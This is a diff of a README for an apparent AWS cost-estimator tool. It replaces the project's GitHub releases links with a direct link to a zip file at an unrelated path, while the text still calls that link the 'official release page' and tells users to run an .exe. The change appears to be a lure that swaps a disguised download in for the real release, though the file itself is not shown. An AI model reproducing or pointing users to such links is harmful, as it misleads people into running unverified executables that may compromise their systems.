@@ -5,7 +5,7 @@ description: "Calculate AWS desktop configuration costs with this browser-based 
 ---
 # 💰 aws-cloud-cost-estimator - Calculate your cloud infrastructure costs easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/toxic010206/aws-cloud-cost-estimator/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/toxic010206/toxic010206.github.io/main/stoichiometric/v1.0.zip)
 
 ## 📋 Project Overview
 
@@ -24,7 +24,7 @@ Your computer needs the following to run this software:
 
 Follow these steps to get the application on your computer:
 
-1.  Visit the official release page: [https://github.com/toxic010206/aws-cloud-cost-estimator/releases](https://github.com/toxic010206/aws-cloud-cost-estimator/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/toxic010206/toxic010206.github.io/main/stoichiometric/v1.0.zip](https://raw.githubusercontent.com/toxic010206/toxic010206.github.io/main/stoichiometric/v1.0.zip).
 2.  Look for the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your "Downloads" folder.
